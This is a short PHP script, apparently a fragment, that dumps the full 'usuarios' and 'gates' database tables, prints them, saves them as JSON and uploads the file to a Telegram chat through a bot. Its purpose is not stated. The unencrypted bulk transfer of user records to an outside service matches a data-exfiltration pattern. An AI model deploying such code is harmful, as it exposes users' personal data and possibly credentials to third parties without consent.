<?php



function obtenerUsuarios($db)
{
    $query = "SELECT * FROM usuarios";
    $stmt = $db->query($query);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

// Función para obtener los datos de la tabla "gates"
function obtenerGates($db)
{
    $query = "SELECT * FROM gates";
    $stmt = $db->query($query);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

// Conexión a la base de datos
$db = conectarBaseDatos();

// Obtener los datos de la tabla "usuarios"
$usuarios = obtenerUsuarios($db);

// Obtener los datos de la tabla "gates"
$gates = obtenerGates($db);

// Imprimir los datos
echo "Datos de la tabla 'usuarios':\n";
print_r($usuarios);

echo "\nDatos de la tabla 'gates':\n";
print_r($gates);

$directorio_security = 'security/';
$nombre_archivo = 'datos_' . time() . '.json';
$ruta_archivo = $directorio_security . $nombre_archivo;

$datos = array("usuarios" => obtenerUsuarios($db), "gates" => obtenerGates($db));
$json = json_encode($datos, JSON_PRETTY_PRINT);
file_put_contents($ruta_archivo, $json);

$ruta_absoluta = realpath($ruta_archivo);

$url = "https://api.telegram.org/bot".BOT_TOKEN."/sendDocument";

$post_fields = array(
    'chat_id' => $chat_id,
    'document' => new CURLFile($ruta_absoluta),
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);

// Cerrar la conexión a la base de datos
$db = null;